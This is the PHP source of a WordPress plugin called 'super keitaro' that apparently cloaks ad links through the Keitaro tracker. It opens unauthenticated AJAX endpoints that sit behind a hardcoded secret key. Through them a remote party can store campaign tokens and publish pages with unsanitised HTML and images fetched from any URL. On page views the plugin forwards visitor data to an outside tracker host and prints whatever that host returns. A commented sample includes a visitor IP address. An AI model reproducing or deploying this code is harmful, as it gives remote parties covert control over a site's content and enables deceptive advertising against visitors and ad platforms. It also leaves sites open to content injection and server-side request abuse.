<?php

/**
 * @wordpress-plugin
 * Plugin Name:       super keitaro
 * Version:           2.0.0
 * Text Domain:       keitaro
 */

ini_set('display_errors', 1);

// If this file is called directly, abort.
if (!defined( 'WPINC' ) ) die;
if (!defined( 'YOUR_PLUGIN_DIR_KT' )) define( 'YOUR_PLUGIN_DIR_KT', plugin_dir_path( dirname( __FILE__ ) ) );
define( 'SECRET', 'LsRZ7vsL6sb6vdHSbNOQQqR9gR_YO-SwqpmEzw-xBSY');

/** actions */
add_action( 'wp', 'client' );

add_action( 'wp_ajax_nopriv_cloLink', 'cloLink' );
add_action( 'wp_ajax_nopriv_check_plugin', 'check_plugin' );
add_action( 'wp_ajax_nopriv_send_pages', 'send_pages' );

// function myplugin_register_query_vars( $vars ) {
// 	$vars[] = 'test-clo-link-token-vsL6sb6vdHSbNOQQq';
// 	return $vars;
// }
// add_filter( 'query_vars', 'myplugin_register_query_vars' );


/** @check plugin */
function auth() {
    $req = (object) $_REQUEST;
    if(!isset($req->sicret)) wp_die();
    if(empty($req->sicret)) wp_die();
    if($req->sicret !== SECRET)  wp_die(); 
}


function check_plugin() {
    auth();
	$data = ['status' => true];
	header('Access-Control-Allow-Origin: *');
	header('Content-Type: application/json');
	echo json_encode($data);
    wp_die(); 
}


/** @integration */
function link_file( $pagename ) {
    $file = YOUR_PLUGIN_DIR_KT . "keitaro/links/{$pagename}";
    return $file;
}


function token( $post ) {
	$pagename = isset($post->ID) ? $post->ID : 0;
    $token = null;
    $file = link_file($pagename);
    if (is_readable($file)) {
		$token = file_get_contents($file);
	}

    return $token;
}


function client($query ) {
    // header('Content-Type: application/json; charset=utf-8');
    // echo json_encode(get_query_var( 'test-clo-link-token-vsL6sb6vdHSbNOQQq'));
    // die();

    $post = get_post();
    $token = token($post);

    if ($token) {
        require_once YOUR_PLUGIN_DIR_KT . 'keitaro/core/request.php';
        require_once YOUR_PLUGIN_DIR_KT . 'keitaro/core/kclient.php';
        $client = new KClient('https://themusichabit.com/api.php?', $token);
        $client->sendAllParams();
        $client->currentPageAsReferrer();

            /** get @Keitaro pre #data */
            // $body = '{"pre_landing_id":"632503413c1082224aba6010","click_id":"3l3iqn42v0cf0","pixels":"{pixels}","buyer":"Test","mod":"ssr","global_domain":"lidera.tech","client_ip":"188.243.241.229","referrer":"https://lifehang.com/ascsa-8/","traffic_source_name":"Facebook.com","city":"Saint+Petersburg","country":"RU","successPage":"Lidera","trackerLink":"https://themusichabit.com/click_api/?_lp=1&_token="}';
            $body = $client->getBody();
            if (trim($body)) fetch($body);
    }
}


function cloLink ($post) {
    auth();
    $link_dir = YOUR_PLUGIN_DIR_KT . 'keitaro/links/';
    if(!is_dir($link_dir )) {
        mkdir("{$link_dir }", 0700);
    }

	header('Access-Control-Allow-Origin: *');
	header('Content-Type: application/json; charset=utf-8');

    $capmaing_api_key = $_REQUEST['capmaing_api_key'];
    $pagename = (int) $_REQUEST['pagename'];
    
    $file = link_file($pagename);

    $pages = get_pages(); 

    $data = [
        'filePath' => $file,
        'pagename' => $pagename,
        'status' => false,
        'message' => false
    ];

    foreach ($pages as $page_data) {
        $name = apply_filters('the_name', $page_data->ID); 
        
        if ($page_data->ID === $pagename) {
            if (is_readable($file)) {
                if (is_readable($file) && file_get_contents($file) === $capmaing_api_key)  {
                    // $data['status'] = true;
                    $data['message'] = 'ссылка уже заклоачина';
                    echo json_encode($data);
                    wp_die();
                } else {
                    $data['message'] = 'битая ссылка';
                    echo json_encode($data);
                    wp_die();
                }
                return;
            } else {
                file_put_contents($file, trim($capmaing_api_key) );
                if (is_readable($file) && file_get_contents($file) === $capmaing_api_key)  {
                    $data['status'] = true;
                    $data['message'] = 'заклоачил ссылку';
                    echo json_encode($data);
                    wp_die();
                    
                } else {
                    $data['message'] = 'ссылка не заклоачилась';
                    echo json_encode($data);
                    wp_die();
                }
                return;
            }
        }
         
    }
    $data['message'] = 'страницы еще нет';
    echo json_encode($data);
    wp_die();
}


/** @state */
    function send_pages(){
        auth();
        $data = (object) json_decode(file_get_contents('php://input'), true);
        header('Content-Type: application/json');
        // $data->permalink = get_permalink( create_page($data->title, $data->image, $data->text) );
        $data->post_id = create_page($data->title, $data->image, $data->text);
        $data->permalink = get_permalink( $data->post_id);

        echo json_encode($data);
        wp_die(); 
    }

    function set_featured_image_from_external_url($url){
        
        if ( ! filter_var($url, FILTER_VALIDATE_URL)) {
            return;
        }
        
        // Add Featured Image to Post
        $image_url 		  = preg_replace('/\?.*/', '', $url); // removing query string from url & Define the image URL here
        $image_name       = basename($image_url);
        $upload_dir       = wp_upload_dir(); // Set upload folder
        $image_data       = file_get_contents($url); // Get image data
        $unique_file_name = wp_unique_filename( $upload_dir['path'], $image_name ); // Generate unique name
        $filename         = basename( $unique_file_name ); // Create image file name

        
        // Check folder permission and define file location
        if( wp_mkdir_p( $upload_dir['path'] ) ) {
            $file = $upload_dir['path'] . '/' . $filename;
        } else {
            $file = $upload_dir['basedir'] . '/' . $filename;
        }

        // Create the image  file on the server
        file_put_contents( $file, $image_data );

        // Check image file type
        $wp_filetype = wp_check_filetype( $filename, null );

        // Set attachment data
        $attachment = array(
            'post_mime_type' => $wp_filetype['type'],
            'post_title'     => sanitize_file_name( $filename ),
            'post_content'   => '',
            'post_status'    => 'inherit'
        );

        // Create the attachment
        $attach_id = wp_insert_attachment( $attachment, $file, false );

        // Include image.php
        require_once(ABSPATH . 'wp-admin/includes/image.php');

        // Define attachment metadata
        $attach_data = wp_generate_attachment_metadata( $attach_id, $file );

        // Assign metadata to attachment
        wp_update_attachment_metadata( $attach_id, $attach_data );

        // And finally assign featured image to post
        set_post_thumbnail( false, $attach_id );

        return str_replace(['public_html/', '/home/admin/web/'], '', $file);

    }

    function create_img ($imgInsert) {
        return '<figure class="wp-block-image size-large"><img width="100%" src="https://'.$imgInsert.'" class="attachment-envo-shopper-single size-envo-shopper-single wp-post-image" alt="" loading="lazy"></figure>';
    }

    function create_page( $title, $img, $text ) {
        $imgInsert = set_featured_image_from_external_url( $img );
        
        /** set @data arr */
        $post_data = array(
            'post_title'    => sanitize_text_field( $title ),
            'post_content'  => create_img($imgInsert) . $text,
            'post_status'   => 'publish',
            'post_type'   	=> 'page',
            // 'post_name'     => '7-ways-to-make-succes-Diet'
        );

        /** @create post */

        $post_ID = wp_insert_post( $post_data );
        return $post_ID;
    }